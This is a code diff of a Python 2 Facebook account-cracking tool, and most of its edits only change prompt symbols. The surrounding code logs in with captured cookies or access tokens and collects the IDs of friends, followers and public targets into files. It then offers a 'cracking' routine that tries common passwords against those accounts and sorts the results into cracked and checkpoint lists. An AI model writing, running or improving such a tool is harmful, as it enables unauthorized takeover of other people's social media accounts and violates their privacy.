@@ -299,7 +299,7 @@ def zmbf():
         print '   [3] Exit Program '
         print '-------------------------------'
 
-    zk = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Choose -> \033[1;32m')
+    zk = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Choose -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -321,7 +321,7 @@ def cookies():
     print cookieslogo
     print '[\033[1;97m\033[1;41m---------Login Using FB ID Cookies--------\033[0m]   '
     print '--------------------------------------------'
-    cookies = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Cookies -> \x1b[0;92m')
+    cookies = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Cookies -> \x1b[0;92m')
     try:
         data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 5.1; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36', 
            'referer': 'https://m.facebook.com/', 
@@ -340,7 +340,7 @@ def cookies():
     cookies = open('login.txt', 'w')
     cookies.write(find_token.group(1))
     cookies.close()
-    zks('\033[1;97m[\033[1;92m✓\033[1;97m] Login Successfull')
+    zks('\033[1;97m[\033[1;92m•\033[1;97m] Login Successfull')
     os.system('xdg-open https://facebook.com/Rishu.X.420')
     zkbot()
     return
@@ -356,7 +356,7 @@ def tokenz():
         print '[\033[1;97m\033[1;41m------Login Using FB ID Access Token------\033[0m]  '
         print '\033[1;97m--------------------------------------------'
         
-    token = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Token -> \x1b[0;92m')
+    token = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Token -> \x1b[0;92m')
     try:
         otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
         a = json.loads(otw.text)
@@ -364,7 +364,7 @@ def tokenz():
         zedd = open('login.txt', 'w')
         zedd.write(token)
         zedd.close()
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m] \x1b[0;92mLogin Successfull')
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] \x1b[0;92mLogin Successfull')
         os.system('xdg-open htpps://facebook.com/Rishu.X.420')
         zkbot()
     except KeyError:
@@ -399,10 +399,10 @@ def cracking_menu():
 
     print logo
     print '\x1b[0;97m--------------------------------------------'
-    print H + ' \033[1;97m[\033[1;92m✓\033[1;97m]Name        : \x1b[0;92m' + H + H + '%s' % nama
-    print '     \033[1;97m[\033[1;92m✓\033[1;97m]User ID     : \x1b[0;92m' + H + id
-    print '     \033[1;97m[\033[1;92m✓\033[1;97m]User Dob    : \x1b[0;92m' + H + dob
-    print '     \033[1;97m[\033[1;92m✓\033[1;97m]User Gender : \x1b[0;92m' + H + gender
+    print H + ' \033[1;97m[\033[1;92m•\033[1;97m]Name        : \x1b[0;92m' + H + H + '%s' % nama
+    print '     \033[1;97m[\033[1;92m•\033[1;97m]User ID     : \x1b[0;92m' + H + id
+    print '     \033[1;97m[\033[1;92m•\033[1;97m]User Dob    : \x1b[0;92m' + H + dob
+    print '     \033[1;97m[\033[1;92m•\033[1;97m]User Gender : \x1b[0;92m' + H + gender
     print '\x1b[0;97m--------------------------------------------'
     print '[\033[1;97m\033[1;41m--------------Cracking Menu---------------\033[0m] '
     print '--------------------------------------------'
@@ -414,7 +414,7 @@ def cracking_menu():
     print ' [06] Follow Me On Facebook '
     print ' [eE] Exit Program  '
     print '--------------------------------------------'
-    zk = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Choose -> \033[1;32m')
+    zk = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Choose -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -458,7 +458,7 @@ def friends(token):
     try:
         pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m] Your Name : ' + sp['name'])
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Your Name : ' + sp['name'])
     except KeyError:
         print '\x1b[0;91mUser Id Not Found!'
         time.sleep(2)
@@ -472,11 +472,11 @@ def friends(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\x1b[0;97m[\x1b[0;97m\xe2\x9e\xa3\x1b[0;97m] \033[1;32mYour Total Friends IDz : %s' % len(id))
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Your Total Friends IDz : %s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
-        print '  \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mFriends Idz Not Found! Try Again!'
+        print '\x1b[0;97m[\x1b[0;91m!\x1b[0;97m] \033[1;31mFriends Idz Not Found! Try Again!'
         time.sleep(2)
         friends()
 
@@ -489,7 +489,7 @@ def myfoll(token):
     try:
         pok = requests.get('https://graph.facebook.com/me/?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m]Your Name : \033[1;32m' + sp['name'])
+        zks('\033[1;97m[\033[1;92m•\033[1;97m]Your Name : \033[1;32m' + sp['name'])
     except KeyError:
         print ' \033[1;31mUser Id Not Found!'
         time.sleep(2)
@@ -503,7 +503,7 @@ def myfoll(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m] Your Total Followers : \033[1;32m%s' % len(id))
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Your Total Followers : \033[1;32m%s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
@@ -516,11 +516,11 @@ def public(token):
     print cracklogo
     print '[\033[1;97m\033[1;41m----------Cracking From Public ID---------\033[0m] '
     print '--------------------------------------------'
-    idt = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Public ID -> \033[1;32m')
+    idt = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Public ID -> \033[1;32m')
     try:
         pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m] Target Name : \033[1;32m' + sp['name'])
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Target Name : \033[1;32m' + sp['name'])
     except KeyError:
         print '\033[1;31mPublic Id Not Found!'
         time.sleep(2)
@@ -534,7 +534,7 @@ def public(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\x1b[0;97m Total Public Friends : \033[1;32m%s' % len(id))
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Total Public Friends : \033[1;32m%s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
@@ -548,11 +548,11 @@ def pfoll(token):
     print cracklogo
     print '[\033[1;97m\033[1;41m-----Cracking From Public Followers------\033[0m]  '
     print '--------------------------------------------'
-    idt = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m]Public ID -> \033[1;32m')
+    idt = raw_input('\033[1;97m[\033[1;92m•\033[1;97m]Public ID -> \033[1;32m')
     try:
         pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
         sp = json.loads(pok.text)
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m] Target Name : \033[1;32m' + sp['name'])
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Target Name : \033[1;32m' + sp['name'])
     except KeyError:
         print ' \033[1;31mPublic Id Not Found!'
         time.sleep(2)
@@ -566,7 +566,7 @@ def pfoll(token):
             zk.write(a['id'] + '<=>' + a['name'] + '\n')
 
         zk.close()
-        zks('\033[1;97m[\033[1;92m✓\033[1;97m] Total Public Followers : \033[1;32m%s' % len(id))
+        zks('\033[1;97m[\033[1;92m•\033[1;97m] Total Public Followers : \033[1;32m%s' % len(id))
         return crackz(filen)
     except (KeyError, IOError):
         os.remove(file)
@@ -580,7 +580,7 @@ def crackz(file):
     print ' [01] Start Cracking  Process   '
     print ' [02] Go Back To Cracking Menu  '
     print '\x1b[0;97m--------------------------------------------'
-    zk = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Choose -> \033[1;32m')
+    zk = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Choose -> \033[1;32m')
     if zk == '':
         print '  [!] Choose An Option'
         time.sleep(2)
@@ -615,13 +615,13 @@ class crackmenu:
         print ' [01]. Auto Passwords '
         print ' [02]. Choose Passwords '
         print '--------------------------------------------'
-        zk = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Choose -> \033[1;32m')
+        zk = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Choose -> \033[1;32m')
         if zk in ('M', 'm', '2', '02'):
             os.system('clear')
             print cracklogo
             print '\x1b[0;97m Enter Password Like: 786786,000786,102030'
             while True:
-                pwx = raw_input('\033[1;97m[\033[1;92m✓\033[1;97m] Enter Choose Password -> \033[1;31m')
+                pwx = raw_input('\033[1;97m[\033[1;92m•\033[1;97m] Enter Choose Password -> \033[1;31m')
                 zks('\x1b[0;97mApplying Passwords: \x1b[0;92m%s' % pwx)
                 print '--------------------------------------------'
                 if pwx == '':
@@ -748,7 +748,7 @@ def relogin():
     print checkerlogo
     print '[\033[1;97m\033[1;41m---------Checkpoints Checking Menu--------\033[0m] '
     print '--------------------------------------------'
-    print '\033[1;97m[\033[1;92m✓\033[1;97m] Example File Name: Cracked/cpz.txt'
+    print '\033[1;97m[\033[1;92m•\033[1;97m] Example File Name: Cracked/cpz.txt'
     files = raw_input('\x1b[0;97m Enter Cracked Idz File Name -> \033[1;31m')
     if files == '':
         print '  [!] Enter A File Name'
